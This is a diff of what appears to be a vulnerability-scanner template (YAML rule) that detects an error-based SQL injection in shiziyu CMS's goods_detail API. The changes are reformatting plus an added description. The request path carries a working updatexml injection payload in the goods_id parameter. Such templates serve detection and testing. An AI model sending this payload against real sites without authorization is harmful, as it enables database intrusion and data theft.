@@ -1,17 +1,21 @@
 id: shiziyu-cms-apicontroller-sqli
 
 info:
-    name: shiziyu cms apicontroller sqli
-    author: sakura404x
-    severity: high
+  name: shiziyu cms apicontroller sqli
+  author: sakura404x
+  severity: high
+  verified: false
+  description: |
+    shiziyu cms apicontroller存在 任意SQL注入漏洞，攻击者可以通过漏洞获取数据库敏感信息
+  tags: shiziyu,cms,apicontroller,sqli,unauthorized
+  created: 2023/05/26
 
 set:
-    rand: randomInt(200000000, 210000000)
+  rand: randomInt(200000000, 210000000)
 rules:
-    r0:
-        request:
-            method: GET
-            path: /index.php?s=api/goods_detail&goods_id=1%20and%20updatexml(1,concat(0x7e,md5({{rand}}),0x7e),1)
-        expression: response.status == 404 && response.body.bcontains(bytes(substr(md5(string(rand)), 0, 31)))
+  r0:
+    request:
+      method: GET
+      path: /index.php?s=api/goods_detail&goods_id=1%20and%20updatexml(1,concat(0x7e,md5({{rand}}),0x7e),1)
+    expression: response.status == 404 && response.body.bcontains(bytes(substr(md5(string(rand)), 0, 31)))
 expression: r0()
-
